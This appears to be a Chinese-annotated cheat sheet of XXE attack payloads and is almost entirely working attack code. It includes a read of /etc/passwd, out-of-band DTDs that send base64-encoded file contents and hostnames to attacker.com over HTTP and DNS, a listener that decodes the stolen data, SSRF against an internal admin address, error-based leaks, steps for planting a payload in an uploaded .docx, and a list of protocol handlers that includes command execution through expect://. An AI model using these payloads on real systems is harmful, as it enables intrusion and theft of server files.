

   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```


|------|------|---------|------|


```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```


```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```


```bash
python3 -m http.server 8000
# 收到 GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```


```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```


```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```


```bash
unzip target.docx -d unpacked/
# 编辑 unpacked/word/document.xml，把开头改成：
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# 上传 evil.docx
```


```text
有回显     → 直接 SYSTEM "file://" 出
报错有回显 → error-based payload（嵌套两层 + 故意触发解析失败）
全无回显   → OOB 标准两层 DTD（DNS / HTTP）
DNS 通 HTTP 不通 → 用 DNS exfil（base32 编码后做子域）
```


```text
file://          → 读本地文件（最常见）
http://, https:// → SSRF
ftp://           → 老版本 Java 也支持
gopher://        → 极少数 PHP 解析器
expect://        → PHP 安装 expect 扩展时可命令执行
jar://           → Java 解压远程 jar 中文件
netdoc://        → 老版本 Java 替代 file://
```


```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- DNS log 收到 hostname.attacker.com -->
```
